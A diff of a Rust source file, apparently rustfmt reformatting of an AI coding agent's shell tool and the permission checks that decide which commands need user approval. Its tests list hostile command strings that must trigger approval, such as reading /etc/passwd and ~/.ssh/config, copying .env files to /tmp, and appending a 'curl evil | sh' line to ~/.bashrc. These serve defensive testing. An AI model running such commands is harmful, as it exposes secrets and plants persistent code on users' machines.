@@ -2,11 +2,11 @@ use std::path::PathBuf;
 use std::process::Stdio;
 use std::time::Duration;
 
-use serde_json::{json, Value};
+use serde_json::{Value, json};
 use tokio::io::AsyncReadExt;
 
 use super::spool::{Spool, Spooled};
-use super::{command, required_str, Ask, Context, Output, Progress, Reason, RunFuture, Tool, ToolError};
+use super::{Ask, Context, Output, Progress, Reason, RunFuture, Tool, ToolError, command, required_str};
 use crate::llm::ToolSpec;
 
 /// Until the user's Settings value arrives.
@@ -45,7 +45,10 @@ impl Bash {
 /// `DRIFT_SHELL` names the shell outright. Otherwise Git's bash is checked before PATH, because
 /// Windows ships a WSL stub named bash.exe in System32; PATH is read as it is now, not at startup.
 fn detect_shell() -> Shell {
-    if let Some(chosen) = std::env::var_os("DRIFT_SHELL").map(PathBuf::from).filter(|path| path.is_file()) {
+    if let Some(chosen) = std::env::var_os("DRIFT_SHELL")
+        .map(PathBuf::from)
+        .filter(|path| path.is_file())
+    {
         return shell_for(chosen);
     }
     let which = crate::platform::process::which;
@@ -53,14 +56,23 @@ fn detect_shell() -> Shell {
     if let Some(bash) = git_bash().or_else(|| which("bash").and_then(real)) {
         return Shell::Bash(bash);
     }
-    let pwsh = which("pwsh").or_else(|| which("powershell")).unwrap_or_else(|| "pwsh".into());
+    let pwsh = which("pwsh")
+        .or_else(|| which("powershell"))
+        .unwrap_or_else(|| "pwsh".into());
     Shell::PowerShell(pwsh)
 }
 
 /// A shell named by path: anything called bash, sh or zsh speaks bash; anything else is taken for PowerShell.
 fn shell_for(path: PathBuf) -> Shell {
-    let stem = path.file_stem().map(|stem| stem.to_string_lossy().to_ascii_lowercase()).unwrap_or_default();
-    if matches!(stem.as_str(), "bash" | "sh" | "zsh") { Shell::Bash(path) } else { Shell::PowerShell(path) }
+    let stem = path
+        .file_stem()
+        .map(|stem| stem.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default();
+    if matches!(stem.as_str(), "bash" | "sh" | "zsh") {
+        Shell::Bash(path)
+    } else {
+        Shell::PowerShell(path)
+    }
 }
 
 /// Git for Windows wherever it is installed: beside the `git` on PATH (Git puts only `cmd` there),
@@ -77,12 +89,18 @@ fn git_bash() -> Option<PathBuf> {
         env("LOCALAPPDATA").map(|local| local.join("Programs/Git/bin/bash.exe")),
         scoop.map(|scoop| scoop.join("apps/git/current/bin/bash.exe")),
     ];
-    crate::platform::process::which("git").and_then(|git| bash_beside(&git)).or_else(|| known.into_iter().flatten().find(|candidate| candidate.is_file()))
+    crate::platform::process::which("git")
+        .and_then(|git| bash_beside(&git))
+        .or_else(|| known.into_iter().flatten().find(|candidate| candidate.is_file()))
 }
 
 /// `git.exe` sits in `<root>/cmd`, `<root>/bin` or `<root>/mingw64/bin`; its bash is `<root>/bin/bash.exe`.
 fn bash_beside(git: &std::path::Path) -> Option<PathBuf> {
-    git.ancestors().skip(1).take(3).map(|dir| dir.join("bin").join("bash.exe")).find(|candidate| candidate.is_file())
+    git.ancestors()
+        .skip(1)
+        .take(3)
+        .map(|dir| dir.join("bin").join("bash.exe"))
+        .find(|candidate| candidate.is_file())
 }
 
 /// What the model must know about the shell, which differs most on Windows: Git's bash there is still Unix bash.
@@ -92,7 +110,9 @@ fn shell_note(shell: &Shell, windows: bool) -> &'static str {
             "Git Bash on Windows. It is Unix bash, not cmd: discard output with `/dev/null`, never `NUL`; change directory with `cd`, never `cd /d`; write paths as `C:/dir/file` or `/c/dir/file`"
         }
         Shell::Bash(_) => "bash",
-        Shell::PowerShell(path) if windows_powershell(path) => "Windows PowerShell 5.1 (powershell.exe, not PowerShell 7); use PowerShell 5.1 syntax, not bash",
+        Shell::PowerShell(path) if windows_powershell(path) => {
+            "Windows PowerShell 5.1 (powershell.exe, not PowerShell 7); use PowerShell 5.1 syntax, not bash"
+        }
         Shell::PowerShell(_) => "PowerShell 7 (pwsh); use PowerShell syntax, not bash",
     }
 }
@@ -109,7 +129,8 @@ fn chain_note(shell: &Shell) -> &'static str {
 
 /// `powershell.exe` is Windows PowerShell 5.1; PowerShell 7 is `pwsh`.
 fn windows_powershell(path: &std::path::Path) -> bool {
-    path.file_stem().is_some_and(|stem| stem.eq_ignore_ascii_case("powershell"))
+    path.file_stem()
+        .is_some_and(|stem| stem.eq_ignore_ascii_case("powershell"))
 }
 
 impl Tool for Bash {
@@ -120,7 +141,10 @@ impl Tool for Bash {
     fn spec(&self) -> ToolSpec {
         ToolSpec {
             name: "bash".into(),
-            description: include_str!("prompts/bash.txt").trim().replace("{shell}", shell_note(&self.shell, cfg!(windows))).replace("{chain}", chain_note(&self.shell)),
+            description: include_str!("prompts/bash.txt")
+                .trim()
+                .replace("{shell}", shell_note(&self.shell, cfg!(windows)))
+                .replace("{chain}", chain_note(&self.shell)),
             input_schema: json!({
                 "type": "object",
                 "properties": {
@@ -136,7 +160,11 @@ impl Tool for Bash {
 
     fn ask(&self, ctx: &Context, input: &Value) -> Option<Ask> {
         let command = input["command"].as_str()?;
-        let mut ask = Ask::shell(self.dialect(), command, input["description"].as_str().unwrap_or(command));
+        let mut ask = Ask::shell(
+            self.dialect(),
+            command,
+            input["description"].as_str().unwrap_or(command),
+        );
         // A workdir outside the workspace is refused when the call runs, so moves are judged from inside.
         let dir = workdir(ctx, input).unwrap_or_else(|_| ctx.workspace.clone());
         drop_moves_within(ctx, &dir, &mut ask);
@@ -153,7 +181,9 @@ impl Tool for Bash {
     /// A line made only of commands known to read (`git status`, `ls`, `rg`, ...) with no redirection
     /// that writes is not captured before and after; anything else, or anything unclear, is.
     fn call_mutates(&self, input: &Value) -> bool {
-        input["command"].as_str().is_none_or(|line| !command::reads_only(self.dialect(), line))
+        input["command"]
+            .as_str()
+            .is_none_or(|line| !command::reads_only(self.dialect(), line))
     }
 
     fn run<'a>(&'a self, ctx: &'a Context, input: Value) -> RunFuture<'a> {
@@ -173,17 +203,30 @@ impl Tool for Bash {
                     cmd
                 }
             };
-            cmd.current_dir(&dir).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).kill_on_drop(true);
+            cmd.current_dir(&dir)
+                .stdin(Stdio::null())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .kill_on_drop(true);
             crate::platform::process::use_current_path(&mut cmd, &Default::default());
             #[cfg(windows)]
             cmd.creation_flags(0x0800_0000 | 0x0000_0004);
             crate::platform::process::prepare(&mut cmd);
-            let mut child = cmd.spawn().map_err(|e| ToolError(format!("could not start shell: {e}")))?;
+            let mut child = cmd
+                .spawn()
+                .map_err(|e| ToolError(format!("could not start shell: {e}")))?;
             // Dropping `tree` for any reason, including this future being dropped, kills every descendant.
-            let tree = child.id().and_then(|pid| crate::platform::process::Tree::adopt(pid).ok());
+            let tree = child
+                .id()
+                .and_then(|pid| crate::platform::process::Tree::adopt(pid).ok());
             #[cfg(windows)]
             resume_main_thread(&child);
-            let path = ctx.engine.data_dir.join("tool-output").join(&ctx.session_id).join(format!("{}.log", ctx.call_id));
+            let path = ctx
+                .engine
+                .data_dir
+                .join("tool-output")
+                .join(&ctx.session_id)
+                .join(format!("{}.log", ctx.call_id));
             let mut spool = Spool::new(Some(path));
             let ended = {
                 let collecting = bounded(limit, collect(&mut child, &mut spool, &ctx.progress));
@@ -197,7 +240,11 @@ impl Tool for Bash {
             }
             // A file the line printed has been seen, as a `read` would have shown it, so it may be edited.
             if matches!(ended, Ended::Exited { code: 0, .. }) {
-                for file in command::files_read(self.dialect(), command).iter().map(|file| super::canonical(&dir.join(file))).filter(|file| file.is_file()) {
+                for file in command::files_read(self.dialect(), command)
+                    .iter()
+                    .map(|file| super::canonical(&dir.join(file)))
+                    .filter(|file| file.is_file())
+                {
                     ctx.files.mark_read(&file);
                 }
             }
@@ -225,7 +272,10 @@ impl Tool for Bash {
 /// How a command's run ended.
 enum Ended {
     /// `lingering`: a background process still held its output open after the shell exited.
-    Exited { code: i32, lingering: bool },
+    Exited {
+        code: i32,
+        lingering: bool,
+    },
     TimedOut,
     Stopped,
     Failed(String),
@@ -300,12 +350,17 @@ fn report(title: String, spooled: Spooled, ended: Ended, limit: Option<Duration>
         Ended::Exited { code, lingering } => {
             metadata["exit"] = json!(code);
             let lingered = lingering.then(|| "Background processes still held the output open when the command finished; they were stopped. Run long-lived processes outside Drift.".to_string());
-            lingered.into_iter().chain((code != 0).then(|| format!("exit code {code}"))).collect()
+            lingered
+                .into_iter()
+                .chain((code != 0).then(|| format!("exit code {code}")))
+                .collect()
         }
         Ended::TimedOut => {
             metadata["timedOut"] = json!(true);
             let seconds = limit.map_or(0, |d| d.as_secs());
-            vec![format!("The command and its child processes were stopped after {seconds} s. If it needs longer and is not waiting for input, run it again with a larger `timeout` in milliseconds.")]
+            vec![format!(
+                "The command and its child processes were stopped after {seconds} s. If it needs longer and is not waiting for input, run it again with a larger `timeout` in milliseconds."
+            )]
         }
         Ended::Stopped => {
             metadata["stopped"] = json!(true);
@@ -316,7 +371,11 @@ fn report(title: String, spooled: Spooled, ended: Ended, limit: Option<Duration>
     for note in &notes {
         super::add_note(&mut text, &mut metadata, note);
     }
-    Output { title, output: text, metadata }
+    Output {
+        title,
+        output: text,
+        metadata,
+    }
 }
 
 const MOVES: [&str; 6] = ["cd", "chdir", "set-location", "sl", "pushd", "push-location"];
@@ -331,18 +390,32 @@ const SEARCHERS: [&str; 3] = ["grep", "rg", "select-string"];
 /// every argument that names a path (a glob by the folder it starts from) resolves inside the
 /// workspace. `--flag=value`, `rev:path` and redirections are judged by their path parts.
 fn why_it_asks(ctx: &Context, dir: &std::path::Path, ask: &Ask) -> Option<Reason> {
-    let Some(commands) = &ask.commands else { return Some(Reason::Hidden) };
-    let mut reasons = commands.iter().enumerate().filter_map(|(index, command)| command_reason(ctx, dir, command, ask.canonical.get(index)));
-    reasons.next().or_else(|| ask.writes.iter().find_map(|target| target_reason(ctx, dir, target)))
+    let Some(commands) = &ask.commands else {
+        return Some(Reason::Hidden);
+    };
+    let mut reasons = commands
+        .iter()
+        .enumerate()
+        .filter_map(|(index, command)| command_reason(ctx, dir, command, ask.canonical.get(index)));
+    reasons
+        .next()
+        .or_else(|| ask.writes.iter().find_map(|target| target_reason(ctx, dir, target)))
 }
 
 /// The program and its subcommand are read as the command runs (`FOO=1 git push` is a push, `sls`
 /// is `Select-String`); every written word but the program is judged as a path, assignments too.
 fn command_reason(ctx: &Context, dir: &std::path::Path, command: &str, canonical: Option<&String>) -> Option<Reason> {
     let written: Vec<&str> = command.split(' ').collect();
-    let runs: Vec<&str> = canonical.filter(|c| !c.is_empty()).map_or_else(|| written.clone(), |c| c.split(' ').collect());
+    let runs: Vec<&str> = canonical
+        .filter(|c| !c.is_empty())
+        .map_or_else(|| written.clone(), |c| c.split(' ').collect());
     let program_at = written.len().saturating_sub(runs.len());
-    let program = runs[0].rsplit(['/', '\\']).next().unwrap_or(runs[0]).trim_end_matches(".exe").to_ascii_lowercase();
+    let program = runs[0]
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(runs[0])
+        .trim_end_matches(".exe")
+        .to_ascii_lowercase();
     let git = (program == "git").then(|| git_subcommand(&runs[1..])).flatten();
     if MOVES.contains(&program.as_str()) {
         return Some(Reason::Moves);
@@ -353,7 +426,11 @@ fn command_reason(ctx: &Context, dir: &std::path::Path, command: &str, canonical
     if git.is_some_and(|sub| beyond_undo(sub, &runs)) {
         return Some(Reason::BeyondUndo);
     }
-    written.iter().enumerate().filter(|(index, _)| *index != program_at).find_map(|(_, word)| word_reason(ctx, dir, word))
+    written
+        .iter()
+        .enumerate()
+        .filter(|(index, _)| *index != program_at)
+        .find_map(|(_, word)| word_reason(ctx, dir, word))
 }
 
 /// Git's subcommand, past its global options (`git -C sub push` is a push).
@@ -384,7 +461,9 @@ fn word_reason(ctx: &Context, dir: &std::path::Path, word: &str) -> Option<Reaso
 }
 
 fn target_reason(ctx: &Context, dir: &std::path::Path, target: &str) -> Option<Reason> {
-    (!target.is_empty() && !super::command::is_sink(target)).then(|| path_reason(ctx, dir, target)).flatten()
+    (!target.is_empty() && !super::command::is_sink(target))
+        .then(|| path_reason(ctx, dir, target))
+        .flatten()
 }
 
 fn path_reason(ctx: &Context, dir: &std::path::Path, word: &str) -> Option<Reason> {
@@ -400,7 +479,10 @@ fn path_reason(ctx: &Context, dir: &std::path::Path, word: &str) -> Option<Reaso
         let path = super::canonical(&dir.join(part));
         // Anything on disk is judged where it resolves, so a plain `notes` linking outside the workspace still asks.
         let exists = std::fs::symlink_metadata(dir.join(part)).is_ok();
-        let rooted = std::path::Path::new(part).components().next().is_some_and(|c| matches!(c, std::path::Component::Prefix(_) | std::path::Component::RootDir));
+        let rooted = std::path::Path::new(part)
+            .components()
+            .next()
+            .is_some_and(|c| matches!(c, std::path::Component::Prefix(_) | std::path::Component::RootDir));
         let names_path = exists || rooted || part.contains(['/', '\\']) || part.starts_with('.');
         if super::sensitive::is_sensitive(&path) {
             Some(Reason::Secret)
@@ -412,10 +494,14 @@ fn path_reason(ctx: &Context, dir: &std::path::Path, word: &str) -> Option<Reaso
 
 /// Where a call runs: its `workdir`, which must be a directory inside the workspace, else the workspace.
 fn workdir(ctx: &Context, input: &Value) -> Result<PathBuf, ToolError> {
-    let Some(asked) = input["workdir"].as_str().filter(|dir| !dir.is_empty()) else { return Ok(ctx.workspace.clone()) };
+    let Some(asked) = input["workdir"].as_str().filter(|dir| !dir.is_empty()) else {
+        return Ok(ctx.workspace.clone());
+    };
     let dir = ctx.resolve(asked);
     if !ctx.inside_workspace(&dir) {
-        return Err(ToolError(format!("workdir {asked} is outside the workspace; use `cd` in the command instead, which asks")));
+        return Err(ToolError(format!(
+            "workdir {asked} is outside the workspace; use `cd` in the command instead, which asks"
+        )));
     }
     if !dir.is_dir() {
         return Err(ToolError(format!("workdir {asked} is not a directory")));
@@ -494,7 +580,9 @@ async fn kill_tree(tree: &Option<crate::platform::process::Tree>, child: &mut to
 #[cfg(windows)]
 fn resume_main_thread(child: &tokio::process::Child) {
     use windows_sys::Win32::Foundation::CloseHandle;
-    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
+    };
     use windows_sys::Win32::System::Threading::{OpenThread, ResumeThread, THREAD_SUSPEND_RESUME};
     let Some(pid) = child.id() else { return };
     unsafe {
@@ -519,7 +607,6 @@ fn resume_main_thread(child: &tokio::process::Child) {
     }
 }
 
-
 #[cfg(test)]
 mod tests {
     use super::super::tests::Sandbox;
@@ -527,7 +614,10 @@ mod tests {
 
     #[test]
     fn output_loses_blank_lines_at_its_ends_but_never_its_first_lines_indentation() {
-        assert_eq!(without_blank_ends("\n\r\n  @@ -1 +1 @@\n-a\n+b\n\n"), "  @@ -1 +1 @@\n-a\n+b");
+        assert_eq!(
+            without_blank_ends("\n\r\n  @@ -1 +1 @@\n-a\n+b\n\n"),
+            "  @@ -1 +1 @@\n-a\n+b"
+        );
         assert_eq!(without_blank_ends("   \n\t\n"), "");
         assert_eq!(without_blank_ends("plain"), "plain");
     }
@@ -541,10 +631,17 @@ mod tests {
             Shell::Bash(_) => "ls && exit 3",
             Shell::PowerShell(_) => "Get-ChildItem -Name; exit 3",
         };
-        let out = bash.run(&sandbox.ctx, json!({ "command": list, "description": "list files" })).await.unwrap();
+        let out = bash
+            .run(&sandbox.ctx, json!({ "command": list, "description": "list files" }))
+            .await
+            .unwrap();
         assert!(out.output.contains("hello.txt"), "{}", out.output);
         assert!(out.output.ends_with("exit code 3"));
-        assert_eq!(out.metadata["notes"], json!(["exit code 3"]), "said by Drift, not printed by the command");
+        assert_eq!(
+            out.metadata["notes"],
+            json!(["exit code 3"]),
+            "said by Drift, not printed by the command"
+        );
         assert_eq!(out.title, "list files");
         assert_eq!(out.metadata["exit"], 3);
     }
@@ -558,13 +655,31 @@ mod tests {
             Shell::Bash(_) => "cat here.txt",
             Shell::PowerShell(_) => "Get-Content here.txt",
         };
-        let out = bash.run(&sandbox.ctx, json!({ "command": print, "workdir": "sub" })).await.unwrap();
+        let out = bash
+            .run(&sandbox.ctx, json!({ "command": print, "workdir": "sub" }))
+            .await
+            .unwrap();
         assert!(out.output.contains("here"), "{}", out.output);
-        assert!(sandbox.ctx.files.was_read(&file), "a file it printed is found from the workdir");
-        let outside = bash.run(&sandbox.ctx, json!({ "command": print, "workdir": ".." })).await.unwrap_err();
+        assert!(
+            sandbox.ctx.files.was_read(&file),
+            "a file it printed is found from the workdir"
+        );
+        let outside = bash
+            .run(&sandbox.ctx, json!({ "command": print, "workdir": ".." }))
+            .await
+            .unwrap_err();
         assert!(outside.0.contains("outside the workspace"), "{}", outside.0);
-        let ask = bash.ask(&sandbox.ctx, &json!({ "command": "cd .. && cargo test", "workdir": "sub" })).unwrap();
-        assert_eq!(ask.commands.unwrap(), ["cargo test"], "a move from the workdir that stays inside asks nothing");
+        let ask = bash
+            .ask(
+                &sandbox.ctx,
+                &json!({ "command": "cd .. && cargo test", "workdir": "sub" }),
+            )
+            .unwrap();
+        assert_eq!(
+            ask.commands.unwrap(),
+            ["cargo test"],
+            "a move from the workdir that stays inside asks nothing"
+        );
     }
 
     #[tokio::test]
@@ -580,30 +695,55 @@ mod tests {
         bash.run(&sandbox.ctx, json!({ "command": print })).await.unwrap();
         bash.run(&sandbox.ctx, json!({ "command": fail })).await.unwrap();
         assert!(sandbox.ctx.files.was_read(&shown), "edit may follow a shell read");
-        assert!(!sandbox.ctx.files.was_read(&missed), "a line that failed is not trusted to have shown it");
+        assert!(
+            !sandbox.ctx.files.was_read(&missed),
+            "a line that failed is not trusted to have shown it"
+        );
     }
 
     /// When each output update was shown, for a command run as `node -e <script>`.
     async fn shows_for(script: &str) -> Vec<std::time::Instant> {
-        let mut child = tokio::process::Command::new("node").args(["-e", script]).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).kill_on_drop(true).spawn().unwrap();
+        let mut child = tokio::process::Command::new("node")
+            .args(["-e", script])
+            .stdin(Stdio::null())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .kill_on_drop(true)
+            .spawn()
+            .unwrap();
         let shown = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
         let record = shown.clone();
         let progress = Progress::new(move |_| record.lock().unwrap().push(std::time::Instant::now()));
         let mut spool = Spool::new(None);
         collect(&mut child, &mut spool, &progress).await;
-        
+
         shown.lock().unwrap().clone()
     }
 
     #[tokio::test]
     async fn a_noisy_command_shows_its_output_at_most_every_show_every_and_a_quiet_one_once() {
-        let noisy = shows_for("let i = 0; const t = setInterval(() => { console.log('line ' + i++); if (i >= 60) clearInterval(t) }, 25)").await;
-        assert!((2..=5).contains(&noisy.len()), "about 1.5 s of output, shown every 500 ms: {} times", noisy.len());
+        let noisy = shows_for(
+            "let i = 0; const t = setInterval(() => { console.log('line ' + i++); if (i >= 60) clearInterval(t) }, 25)",
+        )
+        .await;
+        assert!(
+            (2..=5).contains(&noisy.len()),
+            "about 1.5 s of output, shown every 500 ms: {} times",
+            noisy.len()
+        );
         for pair in noisy.windows(2) {
-            assert!(pair[1] - pair[0] >= SHOW_EVERY - Duration::from_millis(50), "two updates {:?} apart", pair[1] - pair[0]);
+            assert!(
+                pair[1] - pair[0] >= SHOW_EVERY - Duration::from_millis(50),
+                "two updates {:?} apart",
+                pair[1] - pair[0]
+            );
         }
         let quiet = shows_for("console.log('once'); setTimeout(() => {}, 1600)").await;
-        assert_eq!(quiet.len(), 1, "output that stopped growing is not shown again on every tick");
+        assert_eq!(
+            quiet.len(),
+            1,
+            "output that stopped growing is not shown again on every tick"
+        );
     }
 
     #[tokio::test]
@@ -618,16 +758,36 @@ mod tests {
             Shell::Bash(_) => "echo early; sleep 5",
             Shell::PowerShell(_) => "Write-Output early; Start-Sleep 5",
         };
-        let stopped = bash.run(&sandbox.ctx, json!({ "command": early_then_sleep, "timeout": 1500 })).await.unwrap();
+        let stopped = bash
+            .run(&sandbox.ctx, json!({ "command": early_then_sleep, "timeout": 1500 }))
+            .await
+            .unwrap();
         assert!(bash.failed(&stopped), "a command stopped by its limit is a failed call");
-        assert_eq!((stopped.metadata["timedOut"].as_bool(), stopped.metadata["shellTimeoutMs"].as_u64()), (Some(true), Some(1500)));
+        assert_eq!(
+            (
+                stopped.metadata["timedOut"].as_bool(),
+                stopped.metadata["shellTimeoutMs"].as_u64()
+            ),
+            (Some(true), Some(1500))
+        );
         assert!(stopped.output.contains("stopped after"), "{}", stopped.output);
-        assert!(stopped.output.starts_with("early"), "what it printed before the limit is kept: {}", stopped.output);
+        assert!(
+            stopped.output.starts_with("early"),
+            "what it printed before the limit is kept: {}",
+            stopped.output
+        );
 
         sandbox.ctx.engine.set_shell_timeout(Some(Duration::from_millis(300)));
-        assert_eq!(bash.running_metadata(&sandbox.ctx, &json!({ "command": sleep })).unwrap()["shellTimeoutMs"], 300);
+        assert_eq!(
+            bash.running_metadata(&sandbox.ctx, &json!({ "command": sleep }))
+                .unwrap()["shellTimeoutMs"],
+            300
+        );
         let by_setting = bash.run(&sandbox.ctx, json!({ "command": sleep })).await.unwrap();
-        assert_eq!(by_setting.metadata["timedOut"], true, "without a `timeout` the Settings limit applies");
+        assert_eq!(
+            by_setting.metadata["timedOut"], true,
+            "without a `timeout` the Settings limit applies"
+        );
 
         sandbox.ctx.engine.set_shell_timeout(None);
         let quick = match bash.shell {
@@ -635,18 +795,68 @@ mod tests {
             Shell::PowerShell(_) => "Start-Sleep 1",
         };
         let unlimited = bash.run(&sandbox.ctx, json!({ "command": quick })).await.unwrap();
-        assert!(!bash.failed(&unlimited) && unlimited.metadata["shellTimeoutMs"].is_null(), "no limit lets it finish");
+        assert!(
+            !bash.failed(&unlimited) && unlimited.metadata["shellTimeoutMs"].is_null(),
+            "no limit lets it finish"
+        );
     }
 
     #[test]
     fn odd_lines_never_panic_anywhere_a_line_is_read() {
         let sandbox = Sandbox::new("bash-odd");
-        let odd = ["", " ", ";", ";;", "&&", "|", "| cat", "A=1", "A=1;", "A=1 | B=2", "A=1 > x", "> x", "2>&1", "cd", "cd ;", "git", "git -C", "git -C dir", "sed", "sed -n", "sed -n '1p'", "cat", "head -3", "\\(", "( )", "'", "\"", "`", "$", "~", "B=\"x\"; cat a.rs", "FOO= git push", "=x", "x=", "<>", ">", ">>", "&>", "a >&", "find . -printf '%p\\n'"];
-        for (dialect, shell) in [(command::Dialect::Bash, Shell::Bash("bash".into())), (command::Dialect::PowerShell, Shell::PowerShell("pwsh".into()))] {
+        let odd = [
+            "",
+            " ",
+            ";",
+            ";;",
+            "&&",
+            "|",
+            "| cat",
+            "A=1",
+            "A=1;",
+            "A=1 | B=2",
+            "A=1 > x",
+            "> x",
+            "2>&1",
+            "cd",
+            "cd ;",
+            "git",
+            "git -C",
+            "git -C dir",
+            "sed",
+            "sed -n",
+            "sed -n '1p'",
+            "cat",
+            "head -3",
+            "\\(",
+            "( )",
+            "'",
+            "\"",
+            "`",
+            "$",
+            "~",
+            "B=\"x\"; cat a.rs",
+            "FOO= git push",
+            "=x",
+            "x=",
+            "<>",
+            ">",
+            ">>",
+            "&>",
+            "a >&",
+            "find . -printf '%p\\n'",
+        ];
+        for (dialect, shell) in [
+            (command::Dialect::Bash, Shell::Bash("bash".into())),
+            (command::Dialect::PowerShell, Shell::PowerShell("pwsh".into())),
+        ] {
             let bash = Bash::with(shell);
             for line in odd {
                 let _ = command::files_read(dialect, line);
-                for command in command::split(dialect, line).map(|split| split.commands).unwrap_or_default() {
+                for command in command::split(dialect, line)
+                    .map(|split| split.commands)
+                    .unwrap_or_default()
+                {
                     let _ = command::subcommand(&command);
                 }
                 if let Some(ask) = bash.ask(&sandbox.ctx, &json!({ "command": line })) {
@@ -661,41 +871,131 @@ mod tests {
         let sandbox = Sandbox::new("bash-reads");
         std::fs::create_dir_all(sandbox.ctx.workspace.join("src")).unwrap();
         let bash = Bash::with(Shell::Bash("bash".into()));
-        let decide = |line: &str| sandbox.ctx.engine.permissions.decide_now("ses_test", &crate::permission::Policy::default(), &bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap());
-        let reads = ["git status", "git log --oneline -10", "ls src", "cat README.md", "cd src && ls", "git diff HEAD~1..HEAD -- src/a.rs", "wc -l src/a.rs"];
+        let decide = |line: &str| {
+            sandbox.ctx.engine.permissions.decide_now(
+                "ses_test",
+                &crate::permission::Policy::default(),
+                &bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap(),
+            )
+        };
+        let reads = [
+            "git status",
+            "git log --oneline -10",
+            "ls src",
+            "cat README.md",
+            "cd src && ls",
+            "git diff HEAD~1..HEAD -- src/a.rs",
+            "wc -l src/a.rs",
+        ];
         // As opencode: writing inside the workspace runs too.
-        let writes = ["cargo test", "ls > out.txt", "ls >out.txt", "ls 2>&1 >src/out.txt", "make >/dev/null 2>&1", "cat <> src/a.rs", "rm -rf dist", "rm src/*.log", "ls *", "npm install", "git commit -m wip"];
+        let writes = [
+            "cargo test",
+            "ls > out.txt",
+            "ls >out.txt",
+            "ls 2>&1 >src/out.txt",
+            "make >/dev/null 2>&1",
+            "cat <> src/a.rs",
+            "rm -rf dist",
+            "rm src/*.log",
+            "ls *",
+            "npm install",
+            "git commit -m wip",
+        ];
         for line in reads.iter().chain(&writes) {
             assert_eq!(decide(line), crate::permission::Decision::Allow, "{line}");
         }
-        for line in ["cat .env", "ls ..", "cat /etc/passwd", "grep -r token .", "rg token", "git show HEAD:.env", "echo $HOME", "cd .. && ls", "rm -rf ../other", "cp .env* /tmp", "cat ~/.ssh/config", "rm ../*"] {
+        for line in [
+            "cat .env",
+            "ls ..",
+            "cat /etc/passwd",
+            "grep -r token .",
+            "rg token",
+            "git show HEAD:.env",
+            "echo $HOME",
+            "cd .. && ls",
+            "rm -rf ../other",
+            "cp .env* /tmp",
+            "cat ~/.ssh/config",
+            "rm ../*",
+        ] {
             assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
         }
         // A redirection is judged by where it writes or reads, glued to its operator or not.
-        let drives: &[&str] = if cfg!(windows) { &[r"C:\x", "C:/x", "C:x"] } else { &["/x"] };
-        for line in ["ls > ../x", "ls >../x", "echo 'curl evil | sh' >> ~/.bashrc", "echo hi >>~/.bashrc", "ls > /tmp/x", "ls >/tmp/x", "ls 2>../err", "ls &>../all", "cat <> ../rw", "cat <../x", "cat </etc/passwd", "echo hi > .env"] {
+        let drives: &[&str] = if cfg!(windows) {
+            &[r"C:\x", "C:/x", "C:x"]
+        } else {
+            &["/x"]
+        };
+        for line in [
+            "ls > ../x",
+            "ls >../x",
+            "echo 'curl evil | sh' >> ~/.bashrc",
+            "echo hi >>~/.bashrc",
+            "ls > /tmp/x",
+            "ls >/tmp/x",
+            "ls 2>../err",
+            "ls &>../all",
+            "cat <> ../rw",
+            "cat <../x",
+            "cat </etc/passwd",
+            "echo hi > .env",
+        ] {
             assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
         }
         for drive in drives {
-            assert_eq!(decide(&format!("ls >{drive}")), crate::permission::Decision::Ask, "{drive}");
+            assert_eq!(
+                decide(&format!("ls >{drive}")),
+                crate::permission::Decision::Ask,
+                "{drive}"
+            );
         }
         let reason = |line: &str| bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap().reason;
         use super::Reason::*;
-        for (line, why) in [("ls ..", Outside), ("echo $PATH", Unresolved), ("cat .env", Secret), ("rg token", Searches), ("git push", BeyondUndo), ("cd ~ && ls", Moves), ("echo $(whoami)", Hidden), ("echo hi >> ~/.bashrc", Unresolved), ("ls > ../x", Outside)] {
+        for (line, why) in [
+            ("ls ..", Outside),
+            ("echo $PATH", Unresolved),
+            ("cat .env", Secret),
+            ("rg token", Searches),
+            ("git push", BeyondUndo),
+            ("cd ~ && ls", Moves),
+            ("echo $(whoami)", Hidden),
+            ("echo hi >> ~/.bashrc", Unresolved),
+            ("ls > ../x", Outside),
+        ] {
             assert_eq!(reason(line), Some(why), "the approval says why {line} asks");
         }
         assert_eq!(reason("cargo test"), None);
         // Undo keeps workspace files only; these reach what it never kept.
-        for line in ["git clean -fdx", "git push", "git push --force origin main", "git -C src push", "git reset --hard HEAD~1", "cargo test && git push"] {
+        for line in [
+            "git clean -fdx",
+            "git push",
+            "git push --force origin main",
+            "git -C src push",
+            "git reset --hard HEAD~1",
+            "cargo test && git push",
+        ] {
             assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
         }
         // An assignment before the program changes nothing about what runs.
-        for (line, why) in [("FOO=1 git push", BeyondUndo), ("LC_ALL=C grep -r token .", Searches), ("FOO=1 cd .. && ls", Moves), ("GIT_DIR=../other git commit -m x", Outside), ("A=1 B=2 git -C src clean -fdx", BeyondUndo)] {
+        for (line, why) in [
+            ("FOO=1 git push", BeyondUndo),
+            ("LC_ALL=C grep -r token .", Searches),
+            ("FOO=1 cd .. && ls", Moves),
+            ("GIT_DIR=../other git commit -m x", Outside),
+            ("A=1 B=2 git -C src clean -fdx", BeyondUndo),
+        ] {
             assert_eq!(reason(line), Some(why), "{line}");
         }
         assert_eq!(decide("RUST_LOG=debug cargo test"), crate::permission::Decision::Allow);
         let powershell = Bash::with(Shell::PowerShell("pwsh".into()));
-        assert_eq!(powershell.ask(&sandbox.ctx, &json!({ "command": "sls token -Path ." })).unwrap().reason, Some(Searches), "an alias is read as its cmdlet");
+        assert_eq!(
+            powershell
+                .ask(&sandbox.ctx, &json!({ "command": "sls token -Path ." }))
+                .unwrap()
+                .reason,
+            Some(Searches),
+            "an alias is read as its cmdlet"
